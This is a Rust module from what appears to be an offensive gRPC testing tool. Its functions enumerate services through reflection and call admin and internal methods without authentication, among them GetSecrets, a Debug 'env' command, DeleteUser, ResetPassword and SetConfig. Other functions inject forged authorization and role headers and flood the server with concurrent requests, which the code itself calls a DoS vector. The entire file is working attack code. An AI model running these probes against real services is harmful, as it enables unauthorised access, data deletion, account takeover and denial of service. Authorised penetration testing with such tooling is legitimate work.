use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn reflect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} gRPC Reflection API Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let svc_re = regex::Regex::new(r#""name"\s*:\s*"([^"]+)""#).ok();
    let reflect_body = serde_json::json!({
        "method": "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
        "message": { "list_services": "" }
    });

    let endpoints = [
        "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
        "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
    ];
    let mut found = false;
    for ep in &endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client
            .post(&target)
            .header("Content-Type", "application/grpc+json")
            .header("TE", "trailers")
            .json(&reflect_body)
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_services =
                    body.contains("service") || body.contains("method") || body.contains("name");
                let tag = if has_services {
                    "REFLECTION ENABLED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:50} {}", "*".cyan(), ep, tag);
                if has_services {
                    found = true;
                    if let Some(ref re) = svc_re {
                        let services: Vec<_> = re
                            .find_iter(&body)
                            .map(|m| m.as_str().to_string())
                            .collect();
                        if !services.is_empty() {
                            println!("  {} Services found:", "[*]".cyan().bold());
                            for s in &services {
                                println!("    {} {}", "*".cyan(), s);
                            }
                        }
                    }
                }
            }
            Err(_) => {
                println!("  {} {:50} error", "*".red(), ep);
            }
        }
    }

    if !found {
        println!(
            "\n{} Reflection API not enabled or not accessible.",
            "[-]".yellow().bold()
        );
    } else {
        println!(
            "\n{} Reflection exposes full service schema — enumerate methods!",
            "[!]".red().bold()
        );
    }
    Ok(())
}

pub async fn method(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} gRPC Method Enumeration & Unauthorized Call",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let methods = [
        (
            "/grpc.health.v1.Health/Check",
            serde_json::json!({"service": ""}),
        ),
        (
            "/grpc.health.v1.Health/Watch",
            serde_json::json!({"service": ""}),
        ),
        ("/admin.AdminService/GetConfig", serde_json::json!({})),
        ("/admin.AdminService/ListUsers", serde_json::json!({})),
        (
            "/admin.AdminService/SetConfig",
            serde_json::json!({"key": "test", "value": "test"}),
        ),
        (
            "/internal.InternalService/GetSecrets",
            serde_json::json!({}),
        ),
        (
            "/internal.InternalService/Debug",
            serde_json::json!({"cmd": "env"}),
        ),
        ("/user.UserService/GetAllUsers", serde_json::json!({})),
        ("/user.UserService/DeleteUser", serde_json::json!({"id": 1})),
        (
            "/auth.AuthService/ResetPassword",
            serde_json::json!({"user": "admin"}),
        ),
    ];

    let mut accessible = Vec::new();
    for (method, body) in &methods {
        let target = format!("{}{}", url.trim_end_matches('/'), method);
        match client
            .post(&target)
            .header("Content-Type", "application/grpc+json")
            .header("TE", "trailers")
            .json(&body)
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let accessible_tag = if status == 200 {
                    "ACCESSIBLE".red().bold().to_string()
                } else if status == 401 || status == 403 {
                    "auth required".to_string()
                } else if status == 404 {
                    "not found".to_string()
                } else {
                    format!("status={}", status)
                };
                let has_data = !resp_body.is_empty() && resp_body.len() > 5;
                println!(
                    "  {} {:50} {} {}",
                    "*".cyan(),
                    method,
                    accessible_tag,
                    if has_data {
                        format!("({} bytes)", resp_body.len())
                    } else {
                        "".to_string()
                    }
                );
                if status == 200 {
                    accessible.push(method.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:50} error", "*".red(), method);
            }
        }
    }

    if !accessible.is_empty() {
        println!(
            "\n{} {} method(s) accessible without auth!",
            "[!]".red().bold(),
            accessible.len()
        );
    } else {
        println!(
            "\n{} No methods accessible without authentication.",
            "[-]".green().bold()
        );
    }
    Ok(())
}

pub async fn meta(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} gRPC Metadata Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let injections = [
        ("authorization", "Bearer admin"),
        ("x-forwarded-for", "127.0.0.1"),
        ("x-user-id", "1"),
        ("x-role", "admin"),
        ("x-internal", "true"),
        ("x-debug", "true"),
        ("x-service-account", "root"),
        ("x-token", "admin"),
        ("x-admin", "true"),
        ("cookie", "session=admin"),
    ];

    for (header, value) in &injections {
        let target = format!("{}/grpc.health.v1.Health/Check", url.trim_end_matches('/'));
        match client
            .post(&target)
            .header("Content-Type", "application/grpc+json")
            .header("TE", "trailers")
            .header(*header, *value)
            .json(&serde_json::json!({"service": ""}))
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let tag = if status == 200 {
                    "ACCEPTED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                let has_data =
                    body.contains("admin") || body.contains("root") || body.contains("config");
                println!(
                    "  {} {:25} = {:15} {} {}",
                    "*".cyan(),
                    header,
                    value,
                    tag,
                    if has_data {
                        "REFLECTED".red().to_string()
                    } else {
                        "".to_string()
                    }
                );
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), header);
            }
        }
    }
    Ok(())
}

pub async fn stream(url: &str, count: u32, timeout: u64) -> anyhow::Result<()> {
    println!("{} gRPC Streaming Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} streams: {}", "[*]".cyan().bold(), url, count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut handles = Vec::new();

    for i in 0..count {
        let client = client.clone();
        let target = format!("{}/grpc.health.v1.Health/Check", url.trim_end_matches('/'));
        handles.push(tokio::spawn(async move {
            client
                .post(&target)
                .header("Content-Type", "application/grpc+json")
                .header("TE", "trailers")
                .header("X-Stream-ID", format!("{}", i))
                .json(&serde_json::json!({"service": ""}))
                .send()
                .await
                .map(|r| r.status().as_u16())
                .unwrap_or(0)
        }));
    }

    let mut ok = 0u32;
    let mut err = 0u32;
    for h in handles {
        if let Ok(status) = h.await {
            if status == 200 {
                ok += 1;
            } else {
                err += 1;
            }
        } else {
            err += 1;
        }
    }

    println!(
        "\n{} {} streams OK, {} errors",
        "[*]".cyan().bold(),
        ok,
        err
    );
    if ok > 100 {
        println!(
            "{} Target allows high concurrent streams — DoS vector.",
            "[!]".red().bold()
        );
    }
    Ok(())
}
